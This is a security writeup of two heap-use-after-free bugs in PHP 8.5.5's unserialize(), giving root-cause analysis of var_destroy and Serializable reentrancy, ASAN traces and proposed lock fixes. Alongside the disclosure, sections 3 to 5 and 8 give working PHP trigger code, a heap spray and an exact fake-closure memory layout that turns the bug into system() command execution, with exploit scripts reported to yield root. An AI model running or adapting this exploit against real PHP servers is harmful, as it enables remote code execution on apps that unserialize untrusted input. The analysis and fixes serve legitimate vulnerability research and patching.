# PHP 8.5.5 `unserialize()` Heap-Use-After-Free — Writeup

**Affected:** PHP 8.5.5 (current stable). Pattern present since PHP 5.1 (~21 years).
**Status:** No CVE — PHP policy since 2017 does not assign CVEs for `unserialize()` memory-corruption bugs.
**Original reports:** [Calif.io MAD Bugs](https://blog.calif.io/p/mad-bugs-finding-and-exploiting-a) (2026-05-01), dinosn var_destroy reentrancy (2026-05-02).

---

## 1. Overview

PHP's `unserialize()` uses a `var_hash` structure to track back-references (`R:N`) and manage deferred destructors. Two independent root causes allow user `__destruct()` to fire during `var_destroy()` without `BG(serialize_lock)` held. At that point, Phase 1 has already `efree`'d the `var_entries` chunks that store back-reference pointers. An inner `unserialize('R:N;')` from the destructor reuses the outer `var_hash` and calls `var_access(N)`, which walks the freed linked list — heap-use-after-free.

| | Calif UAF | var_destroy UAF |
|---|---|---|
| **Root cause** | `zend_user_unserialize()` missing lock | `var_destroy()` Phase 2 runs without lock |
| **Entry point** | `Serializable::unserialize()` via `C:` format | Duplicate array key |
| **Independence** | Survives var_destroy fix | Survives Calif fix |

---

## 2. Background: Unserializer Internals

### 2.1 `var_hash` Structure

`var_entries` stores `zval*` pointers for `R:N` back-references. When `VAR_ENTRIES_MAX` (1018) slots are filled, a new chunk is `emalloc`'d and linked via `next`:

```c
typedef struct {
    zval *data[VAR_ENTRIES_MAX];  // 8144 bytes (64-bit)
    zend_long used_slots;          // 8 bytes
    void *next;                    // 8 bytes
} var_entries;  // total: 8160 bytes
```

### 2.2 `var_destroy` Two-Phase Destruction

```c
PHPAPI void var_destroy(php_unserialize_data_t *var_hashx) {
    // Phase 1: efree ALL back-ref chunks (no zval_ptr_dtor)
    while (var_hash) {
        next = var_hash->next;
        efree_size(var_hash, sizeof(var_entries));
        var_hash = next;
    }

    // Phase 2: process dtor entries (triggers __destruct)
    while (var_dtor_hash) {
        for (i = 0; i < var_dtor_hash->used_slots; i++) {
            i_zval_ptr_dtor(zv);  // __destruct fires here
        }
        next = var_dtor_hash->next;
        efree_size(var_dtor_hash, sizeof(var_dtor_entries));
        var_dtor_hash = next;
    }
}
```

After Phase 1, `(*var_hashx)->first` is a dangling pointer.

### 2.3 `php_var_unserialize_init` — var_hash Reuse

```c
PHPAPI php_unserialize_data_t php_var_unserialize_init() {
    if (BG(serialize_lock) || !BG(unserialize).level) {
        d = ecalloc(1, sizeof(struct php_unserialize_data));
    } else {
        d = BG(unserialize).data;  // REUSE outer var_hash
        ++BG(unserialize).level;
    }
    return d;
}
```

When `serialize_lock == 0 && level > 0`, the new call **reuses** the existing `var_hash` — whose `first` pointer is dangling.

### 2.4 `var_access` — The UAF Read

```c
static zval *var_access(php_unserialize_data_t *var_hashx, zend_long id) {
    var_entries *var_hash = (*var_hashx)->first;  // dangling pointer
    while (id >= VAR_ENTRIES_MAX && var_hash && var_hash->used_slots == VAR_ENTRIES_MAX) {
        var_hash = var_hash->next;  // walks freed chunks
        id -= VAR_ENTRIES_MAX;
    }
    return var_hash->data[id];  // reads pointer from freed memory
}
```

---

## 3. Root Cause 1: var_destroy UAF (dinosn)

`var_destroy()` holds `BG(serialize_lock)` only around explicit `__wakeup` and `__unserialize` dispatches. The `i_zval_ptr_dtor(zv)` at the main dtor slot runs **without the lock**.

Trigger — duplicate array key pushes object onto dtor chain:

```php
class A {
    public function __destruct() {
        $r = @unserialize('R:1500;');
    }
}
$N = 2000;
$payload = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) $payload .= "i:$i;i:$i;";
$payload .= 'i:99999;O:1:"A":0:{}';
$payload .= 'i:99999;i:42;';
$payload .= '}';
@unserialize($payload);
```

Flow: Phase 1 frees `var_entries` chunks → Phase 2 `i_zval_ptr_dtor` triggers `__destruct` (no lock) → `unserialize('R:1500;')` reuses outer `var_hash` → `var_access(1500)` reads freed memory.

---

## 4. Root Cause 2: Calif UAF (Missing serialize_lock)

`zend_user_unserialize()` dispatches `Serializable::unserialize()` **without** `BG(serialize_lock)++`:

```c
// Zend/zend_interfaces.c
zend_call_method_with_1_params(   // NO serialize_lock++ !
    object, ce, &ce->unserialize_func, "unserialize", NULL, &zdata);
```

Trigger — `Serializable` re-entrant call:

```php
class Evil implements Serializable {
    public function serialize() { return ""; }
    public function unserialize($data) {
        @unserialize('a:2:{i:0;O:7:"Trigger":0:{}i:0;i:42;}');
    }
}
$N = 2000;
$payload = 'a:' . ($N + 1) . ':{' . $entries . 'i:' . $N . ';C:4:"Evil":1:{x}}';
```

Flow: `zend_user_unserialize` (no lock) → `Evil::unserialize()` calls `unserialize()` → reuses outer `var_hash` → Trigger pushed to shared dtor chain → outer `var_destroy` Phase 1 frees chunks → Phase 2 `__destruct` → UAF.

---

## 5. Exploitation: From UAF to RCE

### 5.1 Strategy

Reclaim freed `var_entries` chunks via heap spray with a fake `zend_closure` address. `var_access(N)` returns our controlled pointer. The fake closure's `orig_internal_handler` points to `zif_system`.

### 5.2 Heap Spray

During `__destruct`, allocate strings matching `var_entries` size (8160 bytes):

```php
for ($delta = -64; $delta <= 64; $delta += 8) {
    $len = 8135 + $delta;
    $body = str_repeat(pack('Q', $fake_zval_addr), intdiv($len, 8));
    for ($k = 0; $k < 16; $k++) $spray[] = '' . $body;
}
```

### 5.3 Dynamic Symbol Resolution

Parse `/proc/self/exe` ELF `.symtab`/`.dynsym` sections and `/proc/self/maps` to resolve at runtime:
- `zend_ce_closure` — class entry for closures
- `closure_handlers` — object handlers
- `zif_system` — `system()` internal function
- `zend_closure_internal_handler` — internal closure dispatcher

### 5.4 Fake Closure Layout (PHP 8.5.5)

```
fake_zval (16 bytes):
  +0:  fake_obj_addr   (8 bytes)
  +8:  0x00000008      (4 bytes — IS_OBJECT type)

fake_obj (512 bytes):
  +0:  gc.refcount = 0x7FFF0000
  +4:  gc.type_info = 0x00000018
  +16: ce = zend_ce_closure pointer value
  +24: handlers = closure_handlers
  +56: func.type = ZEND_INTERNAL_FUNCTION (0x01)
  +60: func.fn_flags = ZEND_ACC_PUBLIC
  +88: func.num_args = 0
  +92: func.required_num_args = 0
  +144: func.handler = zend_closure_internal_handler
  +336: orig_internal_handler = zif_system
```

Key offsets differ from PHP 7.2.1: `func.handler` is at obj+144 (vs +104) because 8.5.5 has additional `zend_function.common` fields (attributes, `run_time_cache`, `doc_comment`, `T`, `prop_info`). `orig_internal_handler` at obj+336 (vs +304) follows the larger `sizeof(zend_function)`.

### 5.5 Trigger

```php
$result = @unserialize('R:1500;');
$result('id 1>&2');  // → system("id 1>&2") → uid=0(root)
```

---

## 6. ASAN Detection

Both PoCs produce clean `heap-use-after-free` with ASAN (`-fsanitize=address` during configure):

```
==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x...
    #0 ... in php_var_unserialize ext/standard/var_unserializer.re:855
    #10 ... in var_destroy ext/standard/var_unserializer.re:308

freed by thread T0 here:
    #0 ... in __interceptor_free
    #2 ... in var_destroy ext/standard/var_unserializer.re:244

previously allocated by thread T0 here:
    #2 ... in var_push ext/standard/var_unserializer.re:124
```

---

## 7. Proposed Fixes

### Calif fix (narrow) — lock in `zend_user_unserialize`

```diff
  ZVAL_STRINGL(&zdata, (char*)buf, buf_len);
+ BG(serialize_lock)++;
  zend_call_method_with_1_params(..., "unserialize", NULL, &zdata);
+ BG(serialize_lock)--;
```

Blocks `Serializable` entry only. var_destroy triggers remain exploitable.

### var_destroy fix (complete) — lock over entire dtor walk

```diff
  PHPAPI void var_destroy(php_unserialize_data_t *var_hashx) {
+     BG(serialize_lock)++;
      // Phase 1 + Phase 2 (remove per-site lock/unlock)
+     BG(serialize_lock)--;
  }
```

Blocks all reentry paths, covering both root causes.

---

## 8. Reproduction

```bash
cd 8.5.5
./build.sh

# PoC (ASAN)
./var_destroy_uaf/run_poc.sh   # → heap-use-after-free
./calif_uaf/run_poc.sh          # → heap-use-after-free

# Exploit (non-ASAN)
./var_destroy_uaf/run_exp.sh   # → uid=0(root)
./calif_uaf/run_exp.sh          # → uid=0(root)
```
